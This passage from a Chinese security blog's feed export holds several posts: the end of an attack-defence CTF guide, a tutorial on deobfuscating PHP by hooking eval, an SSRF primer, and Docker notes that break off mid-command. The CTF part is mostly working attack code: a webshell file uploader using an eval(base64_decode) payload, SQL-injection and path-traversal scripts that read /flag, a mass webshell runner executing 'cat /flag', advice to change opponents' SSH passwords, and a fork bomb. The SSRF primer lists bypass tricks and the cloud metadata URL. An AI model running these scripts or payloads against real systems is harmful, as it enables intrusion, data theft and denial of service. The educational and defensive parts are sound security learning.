shell_file = open(shellfile,'rb') local_content = str(open(localfile,'rb').read()) for eachline in shell_file: posturl = eachline.split(',')[0].strip() passwd = eachline.split(',')[1].strip() try: reg = ".*/([^/]*\.php?)" match_shell_name = re.search(reg,eachline) if match_shell_name: shell_name=match_shell_name.group(1) shell_path = get_shell_path(posturl,passwd).strip() target_path = shell_path.split(shell_name)[0]+localfile target_path_base64 = base64.b64encode(target_path) target_file_url = eachline.split(shell_name)[0]+localfile data = &#123;&#125; data[passwd] = '@eval(base64_decode($_POST[z0]));' data['z0']='QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7' data['z1']=target_path_base64 data['z2']=base64.b64encode(local_content) response = post(posturl, data) if response: print '[+] '+target_file_url+', upload succeed!' else: print '[-] '+target_file_url+', upload failed!' else: print '[-] '+posturl+', unsupported webshell!' except Exception,e: print '[-] '+posturl+', connection failed!' shell_file.close() if __name__ == '__main__': main() (2) 或者直接执行下面的脚本 1234567#!/bin/bashwhile truedo flag=$(curl 'http://172.16.4.42:800') curl --cookie "PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD" --data "key="$&#123;flag&#125; "http://172.16.4.42/index.php/wargame/submit" sleep 1sdone (3) 有些SQL注入漏洞可以通过sqlmap利用—sql-shell 执行select load_file(&#39;/flag&#39;)来获取flag。最好直接利用脚本来获得。 123456789def sqli(host): global sess_admin data = &#123;"section_name":"asd","admin_name":"'||(SELECT updatexml(1,concat(0x7e,(select load_file('/flag')),0x7e),1))||'","announcement":"asd"&#125; r = sess_admin.post('http://%s/index.php/section/add'%host,data=data) flags = re.findall(r'~(.+?)~',r.content) if flags: return flags[0] else: return "error pwn!" (4) 文件包含漏洞，直接可以通过../../../../../../flag的方式获取 1234567def include(host): r = requests.get(url="http://%s/?t=../../../../../../flag"%host) flags = re.findall(r'^(.+?)&lt;',r.content) if flags: return flags[0] else: return "error pwn!" (5)批量提交flag的脚本 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python2import sysimport jsonimport urllibimport httplibserver_host = '10.10.0.2'server_port = 80def submit(team_token, flag, host=server_host, port=server_port, timeout=5): if not team_token or not flag: raise Exception('team token or flag not found') conn = httplib.HTTPConnection(host, port, timeout=timeout) params = urllib.urlencode(&#123; 'token': team_token, 'flag': flag, &#125;) headers = &#123; "Content-type": "application/x-www-form-urlencoded" &#125; conn.request('POST', '/api/submit_flag', params, headers) response = conn.getresponse() data = response.read() return json.loads(data)if __name__ == '__main__': if len(sys.argv) &lt; 3: print 'usage: ./submitflag.py $team_token $flag' sys.exit() host = server_host if len(sys.argv) &gt; 3: host = sys.argv[3] print json.dumps(submit(sys.argv[1], sys.argv[2], host=host), indent=4) 7.批量修改ssh密码的脚本(猥琐流直接干掉几个对手) 8.如果有发现有预留后门，要立即使用脚本进行获取flag 12345678910111213141516171819202122232425#coding=utf-8import requestsurl="http://192.168.71."url1=""shell="/Upload/index.php"passwd="abcde10db05bd4f6a24c94d7edde441d18545" port="80"payload = &#123;passwd: 'system(\'cat /flag\');'&#125;f=open("webshelllist.txt","w") f1=open("firstround_flag.txt","w")for i in [51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]: url1=url+str(i)+":"+port+shell try: res=requests.post(url1,payload,timeout=1) if res.status_code == requests.codes.ok: print url1+" connect shell sucess,flag is "+res.text print &gt;&gt;f1,url1+" connect shell sucess,flag is "+res.text print &gt;&gt;f,url1+","+passwd else: print "shell 404" except: print url1+" connect shell fail" f.close()f1.close() 9.自写敏感功能。主办方可能已经把CMS本身的漏洞补全了，并自写了一些敏感功能，如上传、包含界面..，这时候需要自己手动去发现（利用seay代码审计工具可快速定位、ls -t按修改时间来看最新被修改的文件），分析，删除，利用。 10.fork炸弹 12# 参考: https://linux.cn/article-5685-1-rss.html:()&#123;:|:&amp;&#125;;: 0x05 参考 https://xianzhi.aliyun.com/forum/topic/1530 http://bobao.360.cn/ctf/learning/210.html https://mp.weixin.qq.com/s/q6xwmkADGnbHJQRbPblaHg https://www.t00ls.net/viewthread.php?tid=34681 http://rcoil.me/2017/06/CTF线下赛总结 https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10560 http://www.freebuf.com/articles/web/118149.html https://www.secpulse.com/archives/38622.html http://bobao.360.cn/ctf/detail/169.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[解密混淆的PHP代码]]></title>
    <url>%2F2018%2F05%2F23%2Fdecode-garble-phpcode%2F</url>
    <content type="text"><![CDATA[###0x00 前言 被混淆PHP代码见的很多了，但以前比较懒总是用扩展直接decode掉，最近就想手动操作下看看不使用扩展怎么进行解密。 0x01 原理一般来说PHP的混淆都会通过多次eval来还原并执行php代码，所以我们可以通过hook PHP的eval函数来打印其参数来解密代码。 0x02 环境配置OS: ubuntu 18.04 PHP: 5.6.36 首先要安装PHP，此处安装的版本为5.6.36 1.安装相关的依赖库 12sudo apt-get updatesudo apt-get install libxml2-dev build-essential openssl libssl-dev make curl libcurl4-gnutls-dev libjpeg-dev libpng-dev libtool-bin bison php-fpm 2.编译安装libiconv 在libiconv官网下载压缩包，放到/usr/local/src下，解压，编译安装，这里下载的是libiconv-1.15.tar.gz 123456sudo tar zxvf libiconv-1.15.tar.gzcd libiconv-1.15sudo ./configure --prefix=/usr/localsudo makesudo make installsudo ldconfig // 刷新动态链接库缓存 注意，这里是将libiconv安装到了系统默认的lib目录下，安装路径/usr/local不可随意更改，否则后面会出现编译错误。另外，执行sudo make之后会有如下warning 1warning: remember too run &apos;libtool --finish /usr/local/lib&apos; 按照warning的提示执行一下 1libtool --finish /usr/local/lib 3.编译安装PHP 去PHP官网下载php5.6.36压缩包放到/usr/local/src下，解压，编译安装 123456sudo tar zxvf php-5.6.36.tar.gzcd php-5.6.36#由于我们后面要进行调试，所以要在编译时加上-g参数，加调试符号sudo ./configure CFLAGS="-g" CXXFLAGS="-g"sudo make ZEND_EXTRA_LIBS='-liconv' -j16sudo make install 4.补充下扩展的编译安装 在此处以zlib的编译安装为例，由于我们的PHP是编译安装的，所以在路径php-5.6.36/ext/zlib/下就有所需要的文件。如果要安装的扩展在php源码ext目录中没有，可以从PECL上搜索你需要的扩展进行编译安装。 1.在对应的扩展目录运行phpize命令(如果没有提示autoconf记得apt安装) 12345zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ phpize Configuring for:PHP Api Version: 20131106Zend Module Api No: 20131226Zend Extension Api No: 220131226 2.运行configure命令 123zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ ./configurechecking for grep that handles long lines and -e... /bin/grepchecking for egrep... /bin/grep -E 3.运行make命令(之后可以运行也可以不运行make test) 4.运行make install命令 5.配置ini文件 通过运行 php --ini查找php.ini文件位置，然后在文件中添加extension=zlib.so 通过编译安装的PHP是没有php.ini文件的，但是可以通过php --ini查看配置文件的路径，例如: 12345zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ php --iniConfiguration File (php.ini) Path: /usr/local/libLoaded Configuration File: (none)Scan for additional .ini files in: (none)Additional .ini files parsed: (none) 可以看到此时Configuration File显示的是none。这种情况你只需要将之前在PHP官网下载的PHP文件中的php.ini拷贝一份到Configuration File (php.ini) Path路径下就可以了。操作完之后再执行php --ini可以看到如下显示: 12345zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ php --iniConfiguration File (php.ini) Path: /usr/local/libLoaded Configuration File: /usr/local/lib/php.iniScan for additional .ini files in: (none)Additional .ini files parsed: (none) 0x03 开始HookPHP中的eval函数在Zend里需要调用zend_compile_string函数，我们先看下zend_compile_string函数的位置。 12345678zeroyu@ubuntu:~/Desktop/php-5.6.36/Zend$ grep -rn "zend_compile_string" *Binary file zend_alloc.o matchesBinary file zend_API.o matchesBinary file zend_ast.o matchesBinary file zend_builtin_functions.o matcheszend.c:693: zend_compile_string = compile_string;Binary file zend_closures.o matcheszend_compile.c:98:ZEND_API zend_op_array *(*zend_compile_string)(zval *source_string, char *filename TSRMLS_DC); 我们发现zend_compile_string函数其实就是compile_string函数。所以我在这儿测试一个前几天偶然间得到的被混淆的PHP代码，如下所示可以看到在compile_string中已经获取到eval参数的值。 我们可以看到程序断下来后，compile_string的第一个参数source_string为php代码中eval函数的参数在Zend中的结构——即zval_struct。source_string.value.str.val即为参数的字符串形式。所以之后修改修改compile_string函数来打印eval的参数就可以得到解密后的代码了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071zeroyu@ubuntu:~/Desktop$ gdb phpgdb-peda$ set args a.php gdb-peda$ b compile_stringBreakpoint 1 at 0x46e73f: file Zend/zend_language_scanner.l, line 716.gdb-peda$ rStarting program: /usr/local/bin/php a.php [Thread debugging using libthread_db enabled]Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".[----------------------------------registers-----------------------------------]RAX: 0x5555559c2726 (&lt;compile_string&gt;: push rbp)RBX: 0x555555a68767 (&lt;execute_ex&gt;: push rbp)RCX: 0x7ffff7e10e48 ("/home/zeroyu/Desktop/a.php(1) : assert code")RDX: 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 ("return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;")RSI: 0x7ffff7e10e48 ("/home/zeroyu/Desktop/a.php(1) : assert code")RDI: 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 ("return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;")RBP: 0x7fffffff9fa0 --&gt; 0x7fffffffa120 --&gt; 0x7fffffffa270 --&gt; 0x7fffffffa420 --&gt; 0x7fffffffa440 --&gt; 0x7fffffffa560 (--&gt; ...)RSP: 0x7fffffff9e80 --&gt; 0x7ffff7e10e48 ("/home/zeroyu/Desktop/a.php(1) : assert code")RIP: 0x5555559c273f (&lt;compile_string+25&gt;: mov rax,QWORD PTR fs:0x28)R8 : 0x7fffffff96c0 --&gt; 0xb ('\x0b')R9 : 0x555555f2cd22 ("assert code")R10: 0x7 R11: 0xa ('\n')R12: 0x555555623210 (&lt;_start&gt;: xor ebp,ebp)R13: 0x7fffffffdfb0 --&gt; 0x2 R14: 0x0 R15: 0x0EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x5555559c272a &lt;compile_string+4&gt;: sub rsp,0x120 0x5555559c2731 &lt;compile_string+11&gt;: mov QWORD PTR [rbp-0x118],rdi 0x5555559c2738 &lt;compile_string+18&gt;: mov QWORD PTR [rbp-0x120],rsi=&gt; 0x5555559c273f &lt;compile_string+25&gt;: mov rax,QWORD PTR fs:0x28 0x5555559c2748 &lt;compile_string+34&gt;: mov QWORD PTR [rbp-0x8],rax 0x5555559c274c &lt;compile_string+38&gt;: xor eax,eax 0x5555559c274e &lt;compile_string+40&gt;: mov edi,0xf8 0x5555559c2753 &lt;compile_string+45&gt;: call 0x5555559e67f3 &lt;_emalloc&gt;[------------------------------------stack-------------------------------------]0000| 0x7fffffff9e80 --&gt; 0x7ffff7e10e48 ("/home/zeroyu/Desktop/a.php(1) : assert code")0008| 0x7fffffff9e88 --&gt; 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 ("return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;")0016| 0x7fffffff9e90 --&gt; 0x8 0024| 0x7fffffff9e98 --&gt; 0x555556280608 --&gt; 0x0 0032| 0x7fffffff9ea0 --&gt; 0x7fffffff9ed0 --&gt; 0x7fffffff9f70 --&gt; 0x7fffffffa180 --&gt; 0x7ffff7fd6d08 --&gt; 0x3d8f8ba3e3f5c724 0040| 0x7fffffff9ea8 --&gt; 0x3d559e6d1a 0048| 0x7fffffff9eb0 --&gt; 0x7fffffff9ed0 --&gt; 0x7fffffff9f70 --&gt; 0x7fffffffa180 --&gt; 0x7ffff7fd6d08 --&gt; 0x3d8f8ba3e3f5c724 0056| 0x7fffffff9eb8 --&gt; 0x5555559e6891 (&lt;_efree+78&gt;: leave)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, compile_string (source_string=0x7fffffffa030, filename=0x7ffff7e10e48 "/home/zeroyu/Desktop/a.php(1) : assert code") at Zend/zend_language_scanner.l:716716 &#123;gdb-peda$ p *source_string$1 = &#123; value = &#123; lval = 0x7ffff7fd22d0, dval = 6.953349167324743e-310, str = &#123; val = 0x7ffff7fd22d0 "return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;", len = 0x31 &#125;, ht = 0x7ffff7fd22d0, obj = &#123; handle = 0xf7fd22d0, handlers = 0x31 &#125;, ast = 0x7ffff7fd22d0 &#125;, refcount__gc = 0xffffa060, type = 0x6, is_ref__gc = 0x7f&#125; 0x04 小结​ 混淆代码的解密就是类似于代码执行。最终还是要执行PHP代码，而执行PHP代码的方法很多，除了eval函数还有assert、call_user_func、call_user_func_array、create_function等。这些函数的底层也是调用了zend_compile_string，所以也可以利用hook eval来还原混淆后的加密代码。 ​ 这篇也就是对这个解密操作了一下记了个笔记，环境搭建还是比较繁琐的事，所以写的详细了点。了解归了解，现实中为了效率还是使用扩展比较方便，使用的扩展可以参考P牛的，或者这个外国老哥的。如果扩展需要编译的话，方法在上面说过了，编译后不想加入php.ini的话，可以在每次用的时候执行php -d extension=evalhook.so a.php。 0x05 参考解密混淆的PHP程序–逢魔安全实验室 phpjiami 数种解密方法—phithon PHPDecode 在线解密工具—Medici.Yan]]></content>
  </entry>
  <entry>
    <title><![CDATA[了解SSRF,这一篇就足够了]]></title>
    <url>%2F2018%2F03%2F06%2Fintroduction-to-ssrf%2F</url>
    <content type="text"><![CDATA[###0x00 概念 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。 ###0x01 可能出现的地方 1.社交分享功能：获取超链接的标题等内容进行显示 2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 3.在线翻译：给网址翻译对应网页的内容 4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片 5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验 6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试 7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作 8.数据库内置功能：数据库的比如mongodb的copyDatabase函数 9.邮件系统：比如接收邮件服务器地址 10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等 11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…… 12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） 13.web钩子：寻找触发特定事件时发出http请求的服务。在大多数web钩子的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。 14.PDF生成器：试着注入指向内部服务的&lt;iframe&gt;,&lt;img&gt;,&lt;base&gt;或者&lt;script&gt;元素或者CSS的url()函数。 15.文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。 16.链接扩展: 最近Mark Litchfield在推特扩展链接上发现了漏洞，名声大涨。 17.文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。例子 ###0x02 漏洞验证 1.排除法：浏览器f12查看源代码看是否是在本地进行了请求 比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞 2.dnslog等工具进行测试，看是否被访问 –可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。 3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址 –从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址 –通过二级域名暴力猜解工具模糊猜测内网地址 4.直接返回的Banner、title、content等信息 5.留意bool型SSRF ###0x03 利用方式 ####1.让服务端去访问相应的网址 ####2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms ####3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件 ####4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}） ####5.攻击内网应用程序（利用跨协议通信技术） ####6.判断内网主机是否存活：方法是访问看是否有端口开放 ​ 某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。 URL parameter Response HTTP status RTT Conclusion http://127.0.0.1:22 200 10ms Port is open http://127.0.0.1:23 500 10ms Port is closed http://10.0.0.1/ 500 30010ms Firewalled or unable to route traffic to server http://10.0.0.1:8080/ 500 10ms Port is closed and traffic is routed to server ​ 对于开放和关闭的端口，每个SSRF响应都不同。试着以不同的响应为基础建立一个开放、闭合端口和标志符之间的映射。上面的表格就是一个例子。 ####7.DoS攻击（请求大文件，始终保持连接keep-alive always） ####8.提取EC2配置文件 越来越多的公司将部分基础设施放到亚马逊的EC2服务器上。亚马逊公开内部服务，每台EC实例都能查询主机元数据。这是AWS文档。如果你在EC2上发现了SSRF漏洞，试着请求http://169.254.169.254/latest/meta-data。响应会提供许多有用的信息便于对基础设施有一定的了解，甚至可能会泄漏亚马逊S3的访问token，API token等等。你也可以下载_ http://169.254.169.254/latest/user-data_和解压数据。 ###0x04 绕过小技巧 注：参考[8]会有更详细的绕过方式总结 1.http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的 2.各种IP地址的进制转换 3.URL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/ 4.短网址绕过 http://t.cn/RwbLKDx 5.xip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意） 指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务) 6.限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80 7.探测内网域名，或者将自己的域名解析到内网ip 8.例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host， 但这样可以用 http://abc@10.153.138.81/ 绕过 ###0x05 漏洞示例 1.Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf 2.discuz！的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换） 3.weblogic的ssrf 0x06 漏洞靶场https://github.com/jobertabma/ground-control ###0x07 漏洞修复 1.禁止跳转 2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题 4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 5.限制请求的端口为http常用的端口，比如 80、443、8080、8090 6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 ###0x08 漏洞利用中牵涉的小技巧 crontab -l 显示当前计划任务 crontab -r 清除当前计划任务 端口转发工具 socat 在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行 AddType application/x-httpd-php .jpg…… 常用的探测内网地址 1234- 10.0.0.0/8- 127.0.0.1/32- 172.16.0.0/12- 192.168.0.0/16 常用的探测端口 122、80、443、8080、8443 ###0x09 相关材料 [1]http://blog.safebuff.com/2016/07/03/SSRF-Tips/ [2]https://paper.seebug.org/393/ [3]https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF [4]http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html [5]https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 [6]http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/ [7]https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html [8]https://www.secpulse.com/archives/65832.html [9]https://www.cnblogs.com/s0ky1xd/p/5859049.html [10]https://www.t00ls.net/articles-41070.html [11]https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2 [12]https://ricterz.me/posts/HITCON%202017%20SSRFme [13]http://bobao.360.cn/learning/detail/240.html [14]https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0 [15]https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf ###0x10 后记 这篇是我整理了之前的一篇笔记，这篇笔记中没有给出案例。后面有空了也会把自己的一些案例笔记整理下。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Docker笔记]]></title>
    <url>%2F2017%2F12%2F02%2FDocker%E7%AC%94%E8%AE%B0%E2%80%94%E5%9F%BA%E7%A1%80%E7%AF%87%2F</url>
    <content type="text"><![CDATA[概念Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。 Docker容器：一个轻量级沙箱，来运行和隔离应用 Docker仓库：用来存储Docker镜像文件的地方 Docker中用于区分的方式是id或者name:tag 安装官方文档：https://docs.docker.com/ 操作镜像1.获取镜像（默认是从docker hub网站进行镜像的获取）123docker pull kalilinux/kali-linux-docker#如果想使用非官方仓库需要指定仓库完整的地址docker pull hub.c.163.com/public/ubuntu:14.04 建议：使用中科大镜像源 https://docker.mirrors.ustc.edu.cn 附带：在国内 docker build 的正确姿势 2.列出镜像123➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux/kali-linux-docker latest 8ececeaf404d 9 months ago 1.56GB REPOSITORY:来自哪个仓库 TAG:镜像的标签信息，能标示来自同一仓库的不同镜像 IMAGE ID:镜像的ID，此字段唯一标示了镜像 CREATED:创建时间 SIZE:镜像的大小 3.添加镜像标签1234567#对kalilinux/kali-linux-docker:latest添加新的标签kalilinux:latest➜ ~ docker tag kalilinux/kali-linux-docker:latest kalilinux:latest#别名不一样但是两者的镜像文件是一样的（id相同）➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux/kali-linux-docker latest 8ececeaf404d 9 months ago 1.56GBkalilinux latest 8ececeaf404d 9 months ago 1.56GB 4.查看详细信息1234567891011121314151617➜ ~ docker inspect kalilinux:latest[ &#123; "Id": "sha256:8ececeaf404d5d63d4e9bf870f4340516f3be040e5db6c005ac8cf96d2c43536", "RepoTags": [ "kalilinux/kali-linux-docker:latest", "kalilinux:latest" ], "RepoDigests": [ "kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d" ], ...... "Metadata": &#123; "LastTagTime": "2017-12-02T04:56:53.8185955Z" &#125; &#125;] 5.查看镜像历史123456789➜ ~ docker history kalilinux:latestIMAGE CREATED CREATED BY SIZE COMMENT8ececeaf404d 9 months ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 9 months ago /bin/sh -c apt-get -y update &amp;&amp; apt-get -y... 251MB&lt;missing&gt; 9 months ago /bin/sh -c #(nop) ENV DEBIAN_FRONTEND=non... 0B&lt;missing&gt; 9 months ago /bin/sh -c echo "deb http://http.kali.org/... 134B&lt;missing&gt; 9 months ago /bin/sh -c #(nop) MAINTAINER steev@kali.org 0B&lt;missing&gt; 11 months ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 11 months ago /bin/sh -c apt-get -y update &amp;&amp; apt-get -y... 286MB 6.搜索镜像123456789101112#搜索所有自动创建的评价为1+的带kali关键字的镜像➜ ~ docker search --automated -s 3 kaliFlag --automated has been deprecated, use --filter=is-automated=true insteadFlag --stars has been deprecated, use --filter=stars=3 insteadNAME DESCRIPTION STARS OFFICIAL AUTOMATEDkalilinux/kali-linux-docker Kali Linux Rolling Distribution Base Image 361 [OK]linuxkonsult/kali-metasploit Kali base image with metasploit 54 [OK]jasonchaffee/kali-linux Kali Linux Docker Container with the kali-... 8 [OK]brimstone/kali 6 [OK]adamoss/kali2-metasploit Kali2 Automated Build 4 [OK]wsec/kali-metasploit Official Kali Base image + Metasploit 3 [OK]kalinon/comicstreamer ComicStreamer is a media server app for sh... 3 [OK] 7.删除镜像12345678910111213#如果同一个标签有多个tag，那么docker rmi只是删除tag而已#如果docker rmi id的话，会先删除所有的tag然后删除镜像#但是若该镜像的容器存在，也是无法删除的，如果想强制删除可以使用docker rmi -f id➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux/kali-linux-docker latest 8ececeaf404d 9 months ago 1.56GBkalilinux latest 8ececeaf404d 9 months ago 1.56GB➜ ~ docker rmi kalilinux/kali-linux-docker:latestUntagged: kalilinux/kali-linux-docker:latestUntagged: kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux latest 8ececeaf404d 9 months ago 1.56GB 8.创建镜像1）基于已有镜像的容器创建 123456789101112#我们先创建容器并安装metasploit-framework➜ ~ docker run -it kalilinux:latest /bin/bashroot@de573c5f5dc6:/# apt update &amp;&amp; apt install metasploit-frameworkroot@de573c5f5dc6:/#exit#记住id为de573c5f5dc6#docker commit -m "改动信息" -a "作者名称" id REPOSITORY:TAG➜ ~ docker commit -m "install msf" -a "zeroyu" de573c5f5dc6 kalilinux:0.1sha256:66a6770d79d88c826b2e4a38b98037c14de0b9d2ce897307dc30afbf675ce51a➜ ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEkalilinux 0.1 66a6770d79d8 21 seconds ago 2.54GBkalilinux latest 8ececeaf404d 9 months ago 1.56GB 2）基于本地模板导入 1docker import ... 9.存出和载入镜像1）存出镜像 1docker save -o docker_for_msf.tar kalilinux:0.1 2）载入镜像 123docker load --input docker_for_msf.tar#或则docker load &lt; docker_for_msf.tar 10.上传镜像1docker push kalilinux:0.1 操作容器1.创建容器1）新建容器 123456789#docker create新建的容器处于静止，可以使用docker start来启动它#-i 保持标准输入打开 -t分配一个伪终端➜ ~ docker create -it kalilinux:0.12bc48b88a424c8056fe9e6311848d5850c4e46008feec99ee095bc341ae9adaf#查看处于终止状态的容器➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2bc48b88a424 kalilinux:0.1 "/bin/bash" 7 seconds ago Created frosty_poitrasde573c5f5dc6 kalilinux:latest "/bin/bash" 5 hours ago Exited (0) 5 hours ago happy_goldberg 2）启动容器 1234567#docker start id 启动相应的容器#docker ps 查看运行中的容器➜ ~ docker start 2bc48b88a4242bc48b88a424➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2bc48b88a424 kalilinux:0.1 "/bin/bash" 9 minutes ago Up 8 seconds frosty_poitras 3）新建并启动容器 12345678910111213141516171819202122#docker run = docker create + docker start#run的过程：1.检查镜像是否存在，不存在就下载；2.用镜像创建容器；挂载可读写层；3.分配虚拟接口#4.分配IP；5.运行指定程序；6.执行完自动终止➜ ~ docker run kalilinux:0.1 /bin/echo 'zeroyu'zeroyu➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd6a6045c4f8b kalilinux:0.1 "/bin/echo zeroyu" 3 minutes ago Exited (0) 3 minutes ago cocky_kirch➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES#常用命令如下➜ ~ docker run -it kalilinux:0.1 /bin/bashroot@2ed8aa5354f1:/# ps PID TTY TIME CMD 1 pts/0 00:00:00 bash 7 pts/0 00:00:00 psroot@2ed8aa5354f1:/# exitexit#退出后自动处于终止状态➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2ed8aa5354f1 kalilinux:0.1 "/bin/bash" About a minute ago Exited (0) 48 seconds ago goofy_bardeen 4）守护态运行 1234567891011#在后台运行容器➜ ~ docker run -d kalilinux:0.1 /bin/sh -c 